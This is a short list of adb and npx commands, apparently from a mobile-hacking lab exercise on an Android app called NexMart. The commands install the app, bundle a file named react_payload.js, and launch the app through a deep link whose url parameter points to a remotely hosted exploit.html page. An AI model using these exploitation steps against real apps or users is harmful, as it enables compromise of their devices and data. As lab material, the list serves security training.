adb install com.nexmart.shop.apk
npx react-native bundle --platform android --dev false --entry-file react_payload.js --bundle-output react_bundle.js
adb shell 'am start -n com.nexmart.shop/.MainActivity -a android.intent.action.VIEW -d nexmart://promo?url=https://mamatb.github.io/MobileHackingLabs/NexMart/exploit.html'
adb shell 'am start -n com.nexmart.shop/.MainActivity'

